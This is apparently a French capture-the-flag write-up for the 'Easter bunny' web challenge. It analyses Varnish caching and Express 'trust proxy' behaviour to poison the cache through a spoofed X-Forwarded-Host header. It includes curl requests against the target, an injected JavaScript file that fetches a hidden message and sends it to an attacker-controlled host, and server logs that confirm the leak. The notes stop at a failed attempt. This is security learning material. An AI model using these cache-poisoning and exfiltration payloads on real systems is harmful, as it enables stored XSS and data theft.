\section{Easter bunny}

Keywords: varnish, expressjs, cache poisoning, stored xss

\subsection{Analyse de varnish}

\begin{itemize}
    \item \verb+vcl_hash+: Called after \verb+vcl_recv+ to create a hash value
        for the request. This is used as a key to look up the object in
        Varnish.
    \item \verb+vcl_recv+: Its purpose is to decide whether or not to serve the
        request, possibly modify it and decide on how to process it further. A
        backend hint may be set as a default for the backend processing side
    \item \verb+vcl_deliver+: Called before any object except a
        \verb+vcl_synth+ result is delivered to the client.
    \item \verb+vcl_backend_response+: Called after the response headers have
        been successfully retrieved from the backend.
\end{itemize}
\begin{verbatim}
sub vcl_hash {
    hash_data(req.url);
    if (req.http.host) {
        hash_data(req.http.host);
    } else {
        hash_data(server.ip);
    }
    return (lookup);
}
\end{verbatim}

donc la hash est construit avec l'url et le host header si présent sinon
l'addresse du server (\verb+127.0.0.1+) 

le code de \verb+vcl_backend_response+ set les different ttl en fonction de
l'url et de la reponse du serveur dans notre cas \verb+120s+ sur une 200 pour
une requete en prefix \verb+/message+

\verb+vcl_recv+ set différents headers:
\begin{verbatim}
sub vcl_recv {
    set req.http.X-Forwarded-URL = req.url;
    set req.http.X-Forwarded-Proto = "http";
    if( req.http.host ~ ":[0-9]+" )
    {
        set req.http.X-Forwarded-Port = regsub(req.http.host, ".*:", "");
    }
    else
    {
        set req.http.X-Forwarded-Port = "80";
    }

    if ( !( req.url ~ "^/message") ) {
        unset req.http.Cookie;
    }
}
\end{verbatim}


\subsection{Analyse du code}

Il y a un cache

\subsubsection{authorisation.js}
\begin{verbatim}
const authSecret = require('crypto').randomBytes(69).toString('hex');
const isAdmin = (req, res) => {
  return req.ip === '127.0.0.1' && req.cookies['auth'] === authSecret;
};
\end{verbatim}

\subsubsection{bot.js}
donc on a un bot 

\subsubsection{database.js}
 
a mon avis pas d'injection on a du prepare.

par contre le flag se trouve dans un message en bdd. Le message est hidden

\subsubsection{route.js}

sur la route \verb+/message/:id+:
\begin{verbatim}
if (message.hidden && !isAdmin(req))
    return res.status(401).send({
        error: "Sorry, this letter has been hidden by the easter bunny's helpers!",
        count: count
    });

if (message.hidden) res.set("Cache-Control", "private, max-age=0, s-maxage=0 ,no-cache, no-store");
return res.status(200).send({
    message: message.message,
    count: count,
});
\end{verbatim}


donc il faut que l'on soit en local avec le secret.


sur la route \verb+/submit+:
\begin{verbatim}
if (message) {
    return db.insertMessage(message)
        .then(async inserted => {
            try {
                botVisiting = true;
                await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);
                botVisiting = false;
            }
            catch (e) {
                console.log(e);
                botVisiting = false;
            }
            res.status(201).send(response(inserted.lastID));
        })
        .catch(() => {
            res.status(500).send(response('Something went wrong!'));
        });
}
\end{verbatim}

donc le bot est capable d'aller lire les messages par contre il va lire le
\verb+lastID+

sur la route \verb+/letters+:
\begin{verbatim}
router.get("/letters", (req, res) => {
    return res.render("viewletters.html", {
        cdn: `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/`,
    });
});
\end{verbatim}

dans \verb+base.html+:
\begin{verbatim}
<!DOCTYPE html>
<html lang="en">
  <head>
    .. .SNIP. ..
    <base href="{{cdn}}" />
    .. .SNIP. ..
\end{verbatim}

\href{https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base}{base} specifies the base URL to use for all relative URLs in a document. 

visiblement les scripts js sont en relative URL:

\begin{verbatim}
 <script src="viewletter.js"></script>
\end{verbatim}

\subsection{Analyse}

\subsubsection{Premiere idée}

utiliser le bot pour voir la page  Qu'elle soit mise en cache et que l'on puisse tapper dans le cache.

Je ne vois pas comment car le bot ne prend que le last inserted id.

\subsubsection{Seconde idée}

Par quel moyen peut on prendre le controle du bot. Par le js. comme l'adresse
est relative si on arrive a mettre dans cdn notre serveur on devrait pouvoir
lui faire executer une lecture de lettre puis la poster sur notre serveur.

le cache peut il nous aider. Si on arrive a introduire dans la cache une page
moisie.

l'élément important est lié à la gestion d'un proxy et la determination du
hostname.

\href{https://expressjs.com/en/guide/behind-proxies.html}{Express behind
proxies}:
\begin{verbatim}
When running an Express app behind a reverse proxy, some of the Express APIs
may return different values than expected. In order to adjust for this, the
trust proxy application setting may be used to expose information provided by
the reverse proxy in the Express APIs. The most common issue is express APIs
that expose the client’s IP address may instead show an internal IP address of
the reverse proxy.
.. .SNIP. ..
nabling trust proxy will have the following impact:

    The value of req.hostname is derived from the value set in the
    X-Forwarded-Host header, which can be set by the client or by the proxy.

    X-Forwarded-Proto can be set by the reverse proxy to tell the app whether
    it is https or http or even an invalid name. This value is reflected by
    req.protocol.

    The req.ip and req.ips values are populated based on the socket address and
    X-Forwarded-For header, starting at the first untrusted address.

The trust proxy setting is implemented using the proxy-addr package. For more
information, see its documentation.
\end{verbatim}

quand on regarde le code d'\verb+index.js+:
\begin{verbatim}
app.set('trust proxy', process.env.PROXY !== 'false');
\end{verbatim}

donc ce qui signifie que si l'on fait une requete en definissant le header 
\verb+X-Forwarded-Host+, il va être pris comme la valeur de
\verb+req.hostname+.

du coup on va pouvoir faire du stored XSS via le cache car la requête
\verb+/messages+ ne controle pas que l'id existe et retourne une 400.

\begin{verbatim}
$ curl -i -X GET 'http://178.62.88.144:30589/letters?id=28' \
    -H 'Host: 127.0.0.1' \
    -H 'X-Forwarded-Host: 10.10.16.3'
HTTP/1.1 200 OK
.. .SNIP. ..
    <base href="http://10.10.16.3:30589/static/" />
\end{verbatim}

\verb+static/viewletter.js+:
\begin{verbatim}
fetch("http://i127.0.0.1:80/message/3").then((r) => {
    return r.text();
}).then((text) => {
    let myInit = { method: 'GET'};
    fetch("http://10.10.16.3:30589/?" + new URLSearchParams({pwn: text}), myInit)
    });
\end{verbatim}

\begin{verbatim}
$ python -m http.server 30589
10.10.16.3 - - [20/Dec/2022 12:21:52] code 404, message File not found
10.10.16.3 - - [20/Dec/2022 12:21:52] "GET /static/main.css HTTP/1.1" 404 -
10.10.16.3 - - [20/Dec/2022 12:21:52] code 404, message File not found
10.10.16.3 - - [20/Dec/2022 12:21:52] "GET /static/queen.svg HTTP/1.1" 404 -
10.10.16.3 - - [20/Dec/2022 12:21:52] "GET /static/viewletter.js HTTP/1.1" 200 -
10.10.16.3 - - [20/Dec/2022 12:21:53] "GET /?pwn=%7B%22error%22%3A%22Sorry%2C+this+letter+has+been+hidden+by+the+easter+bunny%27s+helpers%21%22%2C%22count%22%3A6%7D HTTP/1.1" 200 -
\end{verbatim}

donc on confirm bien le XSS. Maintenant il va falloir que celui-ci soit pris en
charge par le bot.

donc il faut poluer le cache sur le prochain id qui devrait être créé de la même manière puis passer la requete de
submit.
\begin{verbatim}
$ export RHOST=178.62.88.144:30589
$ export LHOST=10.10.16.3
$ curl -s -i -X GET "http://$RHOST/letters?id=12" \
    -H 'Host: 127.0.0.1' \
    -H "X-Forwarded-Host: $LHOST" \
  | grep -E "(base|X-Cache)"
X-Cache: MISS
X-Cache-Hits: 0
    <base href="http://10.10.16.3:80/static/" />

$ curl -i -X POST http://$RHOST/submit \
    -H 'Content-Type: application/json' -d  '{"message": "pwn"}'
\end{verbatim}

ca ne marche pas. Pas de call de bot
donc ca signifie qu'il ne hit pas le cache.
